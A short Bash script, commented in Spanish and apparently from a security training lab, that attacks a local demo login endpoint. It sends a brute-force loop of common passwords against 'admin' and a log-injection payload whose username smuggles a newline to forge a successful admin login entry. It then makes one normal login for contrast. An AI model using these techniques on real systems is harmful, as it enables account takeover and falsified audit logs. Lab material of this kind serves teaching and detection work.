#!/usr/bin/env bash
# Uso: ./attack.sh [URL]   (por defecto http://localhost:3000)
# SOLO contra la app de laboratorio incluida en este repositorio.
URL="${1:-http://localhost:3000}"
H='Content-Type: application/json'

echo "[1] Fuerza bruta: 8 intentos fallidos contra 'admin'"
for p in 123456 password qwerty admin letmein 111111 abc123 iloveyou; do
  curl -s -o /dev/null -X POST "$URL/login" -H "$H" -d "{\"username\":\"admin\",\"password\":\"$p\"}"
done

echo "[2] Log injection: se intenta falsificar un login exitoso de 'admin'"
curl -s -o /dev/null -X POST "$URL/login" -H "$H" \
  -d '{"username":"mallory\n2026-11-16T10:00:00.000Z INFO login OK user=admin","password":"x"}'

echo "[3] Login legitimo (para que haya trafico normal)"
curl -s -o /dev/null -X POST "$URL/login" -H "$H" -d '{"username":"ana","password":"ana-demo-pass"}'

echo "Listo. Revisa el archivo de log de la app."
